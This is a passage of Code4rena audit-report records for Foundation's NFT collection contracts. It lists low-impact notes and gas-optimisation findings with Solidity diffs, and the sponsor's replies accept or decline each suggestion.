      "content": "\nIn `ICollectionFactory` on line [6](https://github.com/code-423n4/2022-08-foundation/blob/792e00df42/contracts/interfaces/ICollectionFactory.sol#L6), `IProxyCall` is never used and can safely be removed. Unless there is a plan to use it in the future. Maybe a comment explaining why it was imported here would be helpful.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24148",
      "title": "[1] contracts/mixins/collections/CollectionRoyalties.sol",
      "impact": "LOW",
      "content": "\nOn line [80](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/collections/CollectionRoyalties.sol#L80), `supportsInterface` can be rewritten to avoid the `if/esle` branching:\n\n```solidity\nfunction supportsInterface(bytes4 interfaceId) public view virtual override returns (bool interfaceSupported) {\n\treturn (\n\t\tinterfaceId == type(IRoyaltyInfo).interfaceId ||\n\t\tinterfaceId == type(ITokenCreator).interfaceId ||\n\t\tinterfaceId == type(IGetRoyalties).interfaceId ||\n\t\tinterfaceId == type(IGetFees).interfaceId ||\n\t\tsuper.supportsInterface(interfaceId)\n\t);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5575",
      "title": "[G-11] `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)",
      "impact": "GAS",
      "content": "\nPre-increments and pre-decrements are cheaper.\n\nFor a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:\n\n**Increment:**\n\n*   `i += 1` is the most expensive form\n*   `i++` costs 6 gas less than `i += 1`\n*   `++i` costs 5 gas less than `i++` (11 gas less than `i += 1`)\n\n**Decrement:**\n\n*   `i -= 1` is the most expensive form\n*   `i--` costs 11 gas less than `i -= 1`\n*   `--i` costs 5 gas less than `i--` (16 gas less than `i -= 1`)\n\nNote that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name *post-increment*:\n\n```solidity\nuint i = 1;  \nuint j = 2;\nrequire(j == i++, \"This will be false as i is incremented after the comparison\");\n```\n\nHowever, pre-increments (or pre-decrements) return the new value:\n\n```solidity\nuint i = 1;  \nuint j = 2;\nrequire(j == ++i, \"This will be true as i is incremented before the comparison\");\n```\n\nIn the pre-increment case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`.\n\nAffected code:\n\n```solidity\nNFTCollectionFactory.sol:207:      versionNFTCollection++;\nNFTCollectionFactory.sol:231:      versionNFTDropCollection++;\n```\n\nConsider using pre-increments and pre-decrements where they are relevant (meaning: not where post-increments/decrements logic are relevant).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-11-i-costs-less-gas-compared-to-i-or-i--1-same-for---i-vs-i---or-i---1",
      "tags": [],
      "finders": []
    },
    {
      "id": "5574",
      "title": "[G-10] `<array>.length` should not be looked up in every loop of a `for-loop`",
      "impact": "GAS",
      "content": "\nReading array length at each iteration of the loop consumes more gas than necessary.\n\nIn the best case scenario (length read on a memory variable), caching the array length in the stack saves around **3 gas** per iteration.\nIn the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.\n\nHere, consider storing the array's length in a variable before the for-loop, and use this new variable instead:\n\n```solidity\nmixins/shared/MarketFees.sol:126:      for (uint256 i = 0; i < creatorRecipients.length; ++i) {\nmixins/shared/MarketFees.sol:198:    for (uint256 i = 0; i < creatorShares.length; ++i) {\nmixins/shared/MarketFees.sol:484:          for (uint256 i = 0; i < creatorRecipients.length; ++i) {\nmixins/shared/MarketFees.sol:503:      for (uint256 i = 1; i < creatorRecipients.length; ) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-10-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop",
      "tags": [],
      "finders": []
    },
    {
      "id": "5127",
      "title": "[G-13] Use Custom Errors instead of Revert Strings to save Gas",
      "impact": "GAS",
      "content": "\nCustom errors are available from solidity version 0.8.4. Custom errors save [**\\~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\nAdditionally, custom errors can be used inside and outside of contracts (including interfaces and libraries).\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nConsider replacing **all revert strings** with custom errors in the solution, and particularly those that have multiple occurrences:\n\n```solidity\nNFTCollectionFactory.sol:203:    require(_implementation.isContract(), \"NFTCollectionFactory: Implementation is not a contract\");\nNFTCollectionFactory.sol:227:    require(_implementation.isContract(), \"NFTCollectionFactory: Implementation is not a contract\");\n```\n\n**[HardlyDifficult (Foundation) commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/122#issuecomment-1220091166):**\n > Great report, the code diffs really help to understand your points. And the statements like `Saving 3 SLOADs` makes the impact clear. Thanks!\n> \n> \n> [G-01] Check for bytes(_symbol).length > 0 \n> \n> >Agree, and it's good for consistency. Fixed.\n> \n> [G=02] Caching storage values in memory\n> \n> >Agree, will fix this up. Except for the admin update functions since we are not trying to optimize for the admin and I think the code is a little cleaner as is.\n> \n> [G-03] Avoid emitting a storage variable when a memory value is available\n> \n> > Agree, fixed.\n> \n> [G-04] Unchecking arithmetics operations that can't underflow/overflow\n> \n> > Agree, changed.\n> \n> [G-05] calldata\n> \n> > Valid & will fix. This saves ~60 gas on `createNFTDropCollectionWithPaymentFactory`\n> \n> [G-06] Use short error messages\n> \n> > Agree but won't fix. We use up to 64 bytes, aiming to respect the incremental cost but 32 bytes is a bit too short to provide descriptive error messages for our users.\n> \n> [G-07] Duplicated conditions should be refactored to a modifier\n> \n> > Agree, will consider a change here.\n> \n> [G-08] Redundant check\n> \n> > Good catch! Agree, will fix\n> \n> [G-09] Pre-Solidity 0.8.13: > 0 is less efficient than != 0 for unsigned integers\n> \n> > Ahh that's where it got fixed. I've been calling this invalid after testing -- good to know where that had changed. We are compiling with 0.8.16 even though we have a floating 0.8.12.\n> \n> [G-10] Cache Array Length Outside of Loop\n> \n> > May be theoretically valid, but won't fix. I tested this: gas-reporter and our gas-stories suite is reporting a small regression using this technique. It also hurts readability a bit so we wouldn't want to include it unless it was a clear win.\n> \n> [G-11] ++i costs less than i++\n> \n> > Agree and will fix.\n> \n> [G-12] unchecked loop in `getFeesAndRecipients`\n> \n> > `getFeesAndRecipients ` is a read only function not intended to be used on-chain, but as a best practice we will add unchecked there as well.\n> \n> The other example provided was already unchecked -- invalid.\n> \n> [G-13] Custom errors\n> \n> > Agree but won't fix at this time. We use these in the market but not in collections. Unfortunately custom errors are still not as good of an experience for users (e.g. on etherscan). We used them in the market originally because we were nearing the max contract size limit and this was a good way to reduce the bytecode. We'll consider this in the future as tooling continues to improve.\n> \n> \n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-13-use-custom-errors-instead-of-revert-strings-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5126",
      "title": "[G-12] Increments/decrements can be unchecked in for-loops",
      "impact": "GAS",
      "content": "\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.\n\n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nConsider wrapping with an `unchecked` block here (around **25 gas saved** per instance):\n\n```solidity\nmixins/shared/MarketFees.sol:198:    for (uint256 i = 0; i < creatorShares.length; ++i) {\nmixins/shared/MarketFees.sol:484:          for (uint256 i = 0; i < creatorRecipients.length; ++i) {\n```\n\nThe change would be:\n\n```diff\n- for (uint256 i; i < numIterations; i++) {\n+ for (uint256 i; i < numIterations;) {\n // ...  \n+   unchecked { ++i; }\n}  \n```\n\nThe same can be applied with decrements (which should use `break` when `i == 0`).\n\nThe risk of overflow is non-existent for `uint256` here.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-12-incrementsdecrements-can-be-unchecked-in-for-loops",
      "tags": [],
      "finders": []
    },
    {
      "id": "5123",
      "title": "[G-09] Pre-Solidity `0.8.13`: `> 0` is less efficient than `!= 0` for unsigned integers",
      "impact": "GAS",
      "content": "\nUp until Solidity `0.8.13`: `!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nAs the Solidity version used here is `0.8.12`, consider changing `> 0` with `!= 0` here:\n\n```solidity\nNFTDropCollection.sol:88:    require(bytes(_baseURI).length > 0, \"NFTDropCollection: `_baseURI` must be set\");\nNFTDropCollection.sol:130:    require(bytes(_symbol).length > 0, \"NFTDropCollection: `_symbol` must be set\");\nNFTDropCollection.sol:131:    require(_maxTokenId > 0, \"NFTDropCollection: `_maxTokenId` must be set\");\n```\n\nAlso, please enable the Optimizer.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-09-pre-solidity-0813--0-is-less-efficient-than--0-for-unsigned-integers",
      "tags": [],
      "finders": []
    },
    {
      "id": "5122",
      "title": "[G-08] Redundant check",
      "impact": "GAS",
      "content": "\nThe following require statement is redundant:\n\n*   [SequentialMintCollection.sol#L63](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/collections/SequentialMintCollection.sol#L63)\n\n```diff\nFile: SequentialMintCollection.sol\n62:   function _initializeSequentialMintCollection(address payable _creator, uint32 _maxTokenId) internal onlyInitializing {\n- 63:     require(_creator != address(0), \"SequentialMintCollection: Creator cannot be the zero address\"); //@audit gas: this is redundant as only factory can init and always pass good result\n64: \n65:     owner = _creator;\n66:     maxTokenId = _maxTokenId;\n67:   }\n```\n\nThis is due to the fact that the `initialize()` methods have the `onlyContractFactory` modifier already, and that calls to `initialize` from the factory are not using `address(0)` (and hardly ever will in the future of the solution). See these initializations where the first argument is `creator`:\n\n```solidity\ncontracts/NFTCollectionFactory.sol:\n  211:     INFTCollectionInitializer(_implementation).initialize(\n  212        payable(address(rolesContract)),\n```\n\n```solidity\n  237:     INFTDropCollectionInitializer(_implementation).initialize(\n  238        payable(address(this)),\n```\n\n```solidity\n  267:     INFTCollectionInitializer(collection).initialize(payable(msg.sender), name, symbol);\n```\n\n```solidity\n  399:     INFTDropCollectionInitializer(collection).initialize(\n  400        payable(msg.sender),\n```\n\nConsider removing this check.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-08-redundant-check",
      "tags": [],
      "finders": []
    },
    {
      "id": "5121",
      "title": "[G-07] Duplicated conditions should be refactored to a modifier or function to save deployment costs",
      "impact": "GAS",
      "content": "\n```solidity\nNFTCollectionFactory.sol:203:    require(_implementation.isContract(), \"NFTCollectionFactory: Implementation is not a contract\");\nNFTCollectionFactory.sol:227:    require(_implementation.isContract(), \"NFTCollectionFactory: Implementation is not a contract\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-07-duplicated-conditions-should-be-refactored-to-a-modifier-or-function-to-save-deployment-costs",
      "tags": [],
      "finders": []
    },
    {
      "id": "5120",
      "title": "[G-06] Reduce the size of error messages (Long revert Strings)",
      "impact": "GAS",
      "content": "\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\nRevert strings > 32 bytes:\n\n```solidity\nlibraries/AddressLibrary.sol:31:    require(contractAddress.isContract(), \"InternalProxyCall: did not return a contract\");\nmixins/collections/SequentialMintCollection.sol:58:    require(msg.sender == owner, \"SequentialMintCollection: Caller is not creator\");\nmixins/collections/SequentialMintCollection.sol:63:    require(_creator != address(0), \"SequentialMintCollection: Creator cannot be the zero address\");\nmixins/collections/SequentialMintCollection.sol:74:    require(totalSupply() == 0, \"SequentialMintCollection: Any NFTs minted must be burned first\");\nmixins/collections/SequentialMintCollection.sol:87:    require(_maxTokenId != 0, \"SequentialMintCollection: Max token ID may not be cleared\");\nmixins/collections/SequentialMintCollection.sol:88:    require(maxTokenId == 0 || _maxTokenId < maxTokenId, \"SequentialMintCollection: Max token ID may not increase\");\nmixins/collections/SequentialMintCollection.sol:89:    require(latestTokenId <= _maxTokenId, \"SequentialMintCollection: Max token ID must be >= last mint\");\nmixins/roles/AdminRole.sol:19:    require(hasRole(DEFAULT_ADMIN_ROLE, msg.sender), \"AdminRole: caller does not have the Admin role\");\nmixins/roles/MinterRole.sol:22:    require(isMinter(msg.sender) || isAdmin(msg.sender), \"MinterRole: Must have the minter or admin role\");\nmixins/shared/ContractFactory.sol:22:    require(msg.sender == contractFactory, \"ContractFactory: Caller is not the factory\");\nmixins/shared/ContractFactory.sol:31:    require(_contractFactory.isContract(), \"ContractFactory: Factory is not a contract\");\nNFTCollection.sol:158:    require(tokenCreatorPaymentAddress != address(0), \"NFTCollection: tokenCreatorPaymentAddress is required\");\nNFTCollection.sol:263:    require(bytes(tokenCID).length != 0, \"NFTCollection: tokenCID is required\");\nNFTCollection.sol:264:    require(!cidToMinted[tokenCID], \"NFTCollection: NFT was already minted\");\nNFTCollection.sol:268:      require(maxTokenId == 0 || tokenId <= maxTokenId, \"NFTCollection: Max token count has already been minted\");\nNFTCollection.sol:327:    require(_exists(tokenId), \"NFTCollection: URI query for nonexistent token\");\nNFTCollectionFactory.sol:173:    require(rolesContract.isAdmin(msg.sender), \"NFTCollectionFactory: Caller does not have the Admin role\");\nNFTCollectionFactory.sol:182:    require(_rolesContract.isContract(), \"NFTCollectionFactory: RolesContract is not a contract\");\nNFTCollectionFactory.sol:203:    require(_implementation.isContract(), \"NFTCollectionFactory: Implementation is not a contract\");\nNFTCollectionFactory.sol:227:    require(_implementation.isContract(), \"NFTCollectionFactory: Implementation is not a contract\");\nNFTCollectionFactory.sol:262:    require(bytes(symbol).length != 0, \"NFTCollectionFactory: Symbol is required\");\nNFTDropCollection.sol:88:    require(bytes(_baseURI).length > 0, \"NFTDropCollection: `_baseURI` must be set\");\nNFTDropCollection.sol:93:    require(postRevealBaseURIHash != bytes32(0), \"NFTDropCollection: Already revealed\");\nNFTDropCollection.sol:130:    require(bytes(_symbol).length > 0, \"NFTDropCollection: `_symbol` must be set\");\nNFTDropCollection.sol:131:    require(_maxTokenId > 0, \"NFTDropCollection: `_maxTokenId` must be set\");\nNFTDropCollection.sol:172:    require(count != 0, \"NFTDropCollection: `count` must be greater than 0\");\nNFTDropCollection.sol:179:    require(latestTokenId <= maxTokenId, \"NFTDropCollection: Exceeds max tokenId\");\nNFTDropCollection.sol:238:    require(_postRevealBaseURIHash != bytes32(0), \"NFTDropCollection: use `reveal` instead\");\n```\n\nConsider shortening the revert strings to fit in 32 bytes.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-06-reduce-the-size-of-error-messages-long-revert-strings",
      "tags": [],
      "finders": []
    },
    {
      "id": "5119",
      "title": "[G-05] Use `calldata` instead of `memory`",
      "impact": "GAS",
      "content": "\nWhen a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. Each iteration of this for-loop costs at least 60 gas (i.e. `60 * <mem_array>.length`). Using `calldata` directly bypasses this loop.\n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gas-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one\n\nAffected code (around **60 gas** to be saved):\n\n```solidity\nFile: NFTCollectionFactory.sol\n363:   function createNFTDropCollectionWithPaymentFactory(\n364:     string calldata name,\n365:     string calldata symbol,\n366:     string calldata baseURI,\n367:     bytes32 postRevealBaseURIHash,\n368:     uint32 maxTokenId,\n369:     address approvedMinter,\n370:     uint256 nonce,\n- 371:     CallWithoutValue memory paymentAddressFactoryCall\n+ 371:     CallWithoutValue calldata paymentAddressFactoryCall\n372:   ) external returns (address collection) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-05-use-calldata-instead-of-memory",
      "tags": [],
      "finders": []
    },
    {
      "id": "5118",
      "title": "[G-04] Unchecking arithmetics operations that can't underflow/overflow",
      "impact": "GAS",
      "content": "\nWhile this is inside an `external view` function, consider wrapping this in an `unchecked` statement so that external contracts calling this might save some gas:\n\n*   [L245 can be unchecked due to L240](https://github.com/JustDravee/dravee-2022-08-foundation/blob/61ca1242cbfa69f45097286837def0f49558087c/contracts/mixins/nftDropMarket/NFTDropMarketFixedPriceSale.sol#L240-L245)\n\n```diff\nFile: NFTDropMarketFixedPriceSale.sol\n240:     if (currentBalance >= limitPerAccount) {\n241:       // User has exhausted their limit.\n242:       return 0;\n243:     }\n244: \n- 245:     uint256 availableToMint = limitPerAccount - currentBalance;\n+ 245:     uint256 availableToMint;\n+ 245:     unchecked { availableToMint = limitPerAccount - currentBalance; }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-04-unchecking-arithmetics-operations-that-cant-underflowoverflow",
      "tags": [],
      "finders": []
    },
    {
      "id": "5117",
      "title": "[G-03] Avoid emitting a storage variable when a memory value is available",
      "impact": "GAS",
      "content": "\nWhen they are the same, consider emitting the memory value instead of the storage value:\n\n*   [NFTDropCollection.sol#L242](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/NFTDropCollection.sol#L242)\n\n```diff\nFile: NFTDropCollection.sol\n232:   function updatePreRevealContent(string calldata _baseURI, bytes32 _postRevealBaseURIHash)\n233:     external\n234:     validBaseURI(_baseURI)\n235:     onlyWhileUnrevealed\n236:     onlyAdmin\n237:   {\n238:     require(_postRevealBaseURIHash != bytes32(0), \"NFTDropCollection: use `reveal` instead\");\n239: \n240:     postRevealBaseURIHash = _postRevealBaseURIHash;\n241:     baseURI = _baseURI;\n- 242:     emit URIUpdated(baseURI, postRevealBaseURIHash);\n+ 242:     emit URIUpdated(_baseURI, _postRevealBaseURIHash);\n243:   }\n```\n\n*   [NFTDropMarketFixedPriceSale.sol#L156](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/nftDropMarket/NFTDropMarketFixedPriceSale.sol#L156)\n\n```diff\nFile: NFTDropMarketFixedPriceSale.sol\n152:     // Save the sale details.\n153:     saleConfig.seller = payable(msg.sender);\n154:     saleConfig.price = price;\n155:     saleConfig.limitPerAccount = limitPerAccount;\n- 156:     emit CreateFixedPriceSale(nftContract, saleConfig.seller, saleConfig.price, saleConfig.limitPerAccount);\n+ 156:     emit CreateFixedPriceSale(nftContract, payable(msg.sender), price, limitPerAccount);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-03-avoid-emitting-a-storage-variable-when-a-memory-value-is-available",
      "tags": [],
      "finders": []
    },
    {
      "id": "5116",
      "title": "[G-02] Caching storage values in memory",
      "impact": "GAS",
      "content": "\nThe code can be optimized by minimizing the number of SLOADs.\n\nSLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.\n\n*   [Saving many SLOADs (including in a for-loop)](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/NFTDropCollection.sol#L171-L187):\n\n```diff\nFile: NFTDropCollection.sol\n171:   function mintCountTo(uint16 count, address to) external onlyMinterOrAdmin returns (uint256 firstTokenId) { //@audit-ok\n172:     require(count != 0, \"NFTDropCollection: `count` must be greater than 0\");\n173: \n+ 173:      uint32 _latestTokenId = latestTokenId;\n174:     unchecked {\n175:       // If +1 overflows then +count would also overflow, unless count==0 in which case the loop would exceed gas limits\n- 176:       firstTokenId = latestTokenId + 1; //@audit gas: SLOAD 1 (latestTokenId)\n+ 176:       firstTokenId = _latestTokenId + 1;\n177:     }\n- 178:     latestTokenId = latestTokenId + count; //@audit gas: SLOAD 2 (latestTokenId)\n+ 178:     _latestTokenId = _latestTokenId + count;\n+ 178:     latestTokenId = _latestTokenId;\n- 179:     require(latestTokenId <= maxTokenId, \"NFTDropCollection: Exceeds max tokenId\"); //@audit gas: SLOAD 3 (latestTokenId)\n+ 179:     require(_latestTokenId <= maxTokenId, \"NFTDropCollection: Exceeds max tokenId\");\n180: \n- 181:     for (uint256 i = firstTokenId; i <= latestTokenId; ) {  //@audit gas: SLOAD \"latestTokenId - firstTokenId + 1\" (latestTokenId)\n+ 181:     for (uint256 i = firstTokenId; i <= _latestTokenId; ) {\n182:       _mint(to, i);\n183:       unchecked {\n184:         ++i;\n185:       }\n186:     }\n187:   }\n```\n\n*   [Saving 3 SLOADs (+ a pre-increment is cheaper, but this is counter-balanced with the memory variable)](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/NFTCollectionFactory.sol#L202-L218):\n\n```diff\nFile: NFTCollectionFactory.sol\n202:   function adminUpdateNFTCollectionImplementation(address _implementation) external onlyAdmin {\n203:     require(_implementation.isContract(), \"NFTCollectionFactory: Implementation is not a contract\");\n204:     implementationNFTCollection = _implementation;\n+ 204:     uint32 _versionNFTCollection;\n205:     unchecked {\n206:       // Version cannot overflow 256 bits.\n- 207:       versionNFTCollection++;\n+ 207:       _versionNFTCollection = ++versionNFTCollection;\n208:     }\n209: \n210:     // The implementation is initialized when assigned so that others may not claim it as their own.\n211:     INFTCollectionInitializer(_implementation).initialize(\n212:       payable(address(rolesContract)),\n- 213:       string.concat(\"NFT Collection Implementation v\", versionNFTCollection.toString()),\n+ 213:       string.concat(\"NFT Collection Implementation v\", _versionNFTCollection.toString()),\n- 214:       string.concat(\"NFTv\", versionNFTCollection.toString())\n+ 214:       string.concat(\"NFTv\", _versionNFTCollection.toString())\n215:     );\n216: \n- 217:     emit ImplementationNFTCollectionUpdated(_implementation, versionNFTCollection);\n+ 217:     emit ImplementationNFTCollectionUpdated(_implementation, _versionNFTCollection);\n218:   }\n```\n\n*   [Saving 3 SLOADs (+ a pre-increment is cheaper, but this is counter-balanced with the memory variable)](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/NFTCollectionFactory.sol#L226-L247)\n\n```diff\nFile: NFTCollectionFactory.sol\n226:   function adminUpdateNFTDropCollectionImplementation(address _implementation) external onlyAdmin {\n227:     require(_implementation.isContract(), \"NFTCollectionFactory: Implementation is not a contract\");\n228:     implementationNFTDropCollection = _implementation;\n+ 228:         uint32 _versionNFTDropCollection;\n229:     unchecked {\n230:       // Version cannot overflow 256 bits.\n- 231:       versionNFTDropCollection++;\n+ 231:       _versionNFTDropCollection = ++versionNFTDropCollection;\n232:     }\n233: \n- 234:     emit ImplementationNFTDropCollectionUpdated(_implementation, versionNFTDropCollection);\n+ 234:     emit ImplementationNFTDropCollectionUpdated(_implementation, _versionNFTDropCollection);\n235: \n236:     // The implementation is initialized when assigned so that others may not claim it as their own.\n237:     INFTDropCollectionInitializer(_implementation).initialize(\n238:       payable(address(this)),\n- 239:       string.concat(\"NFT Drop Collection Implementation v\", versionNFTDropCollection.toString()),\n- 240:       string.concat(\"NFTDropV\", versionNFTDropCollection.toString()),\n+ 239:       string.concat(\"NFT Drop Collection Implementation v\", _versionNFTDropCollection.toString()),\n+ 240:       string.concat(\"NFTDropV\", _versionNFTDropCollection.toString()),\n241:       \"ipfs://bafybeibvxnuaqtvaxu26gdgly2rm4g2piu7b2tqlx2dsz6wwhqbey2gddy/\",\n242:       0x1337000000000000000000000000000000000000000000000000000000001337,\n243:       1,\n244:       address(0),\n245:       payable(0)\n246:     );\n247:   }\n```\n\n*   [Saving 1 SLOAD. If we're optimistic towards the presence of a `baseURI_` string here, this should be cached](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/NFTCollection.sol#L332-L337):\n\n```diff\nFile: NFTCollection.sol\n332:   function _baseURI() internal view override returns (string memory) {\n- 333:     if (bytes(baseURI_).length != 0) {\n+ 333:     string memory memBaseURI = baseURI_;\n+ 333:     if (bytes(memBaseURI).length != 0) {\n- 334:       return baseURI_;\n+ 334:       return memBaseURI;\n335:     }\n336:     return \"ipfs://\";\n337:   }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-02-caching-storage-values-in-memory",
      "tags": [],
      "finders": []
    },
    {
      "id": "5115",
      "title": "[G-01] Check for `bytes(_symbol).length > 0` before calling `NFTDropCollection.initialize()`, like it's done for `NFTCollection.initialize()`",
      "impact": "GAS",
      "content": "\nThis could save a lot of gas if the revert condition is met.\n\nFor `NFTCollection`, the check is made in `NFTCollectionFactory.createNFTCollection()`.\n\n*   [NFTCollectionFactory.sol#L262](https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollectionFactory.sol#L262)\n\n```solidity\nFile: NFTCollectionFactory.sol\n257:   function createNFTCollection( //@audit-ok OK function\n258:     string calldata name,\n259:     string calldata symbol,\n260:     uint256 nonce\n261:   ) external returns (address collection) {\n262:     require(bytes(symbol).length != 0, \"NFTCollectionFactory: Symbol is required\"); //@audit why is the check inconsistently done ? Here it's in this function but for drop it's in the initialize() function. Chose 1, I'd advise this one style to save gas.\n263: \n264:     // This reverts if the NFT was previously created using this implementation version + msg.sender + nonce\n265:     collection = implementationNFTCollection.cloneDeterministic(_getSalt(msg.sender, nonce));\n266: \n267:     INFTCollectionInitializer(collection).initialize(payable(msg.sender), name, symbol);\n268: \n269:     emit NFTCollectionCreated(collection, msg.sender, versionNFTCollection, name, symbol, nonce);\n270:   }\n```\n\nHowever, for `NFTDropCollection`, the check is made way further, after even the contract's creation (during the initialization):\n\n*   [NFTDropCollection.sol#L130](https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L130)\n\n```solidity\nFile: NFTDropCollection.sol\n120:   function initialize(\n121:     address payable _creator,\n122:     string calldata _name,\n123:     string calldata _symbol,\n124:     string calldata _baseURI,\n125:     bytes32 _postRevealBaseURIHash,\n126:     uint32 _maxTokenId,\n127:     address _approvedMinter,\n128:     address payable _paymentAddress\n129:   ) external initializer onlyContractFactory validBaseURI(_baseURI) {\n130:     require(bytes(_symbol).length > 0, \"NFTDropCollection: `_symbol` must be set\");\n131:     require(_maxTokenId > 0, \"NFTDropCollection: `_maxTokenId` must be set\");\n```\n\nConsider moving the check in `NFTCollectionFactory._createNFTDropCollection()`:\n\n*   [NFTCollectionFactory.sol#L396](https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollectionFactory.sol#L396)\n\n```diff\nFile: NFTCollectionFactory.sol\n386:   function _createNFTDropCollection(\n387:     string calldata name,\n388:     string calldata symbol,\n389:     string calldata baseURI,\n390:     bytes32 postRevealBaseURIHash,\n391:     uint32 maxTokenId,\n392:     address approvedMinter,\n393:     address payable paymentAddress,\n394:     uint256 nonce\n395:   ) private returns (address collection) {\n396:     // This reverts if the NFT was previously created 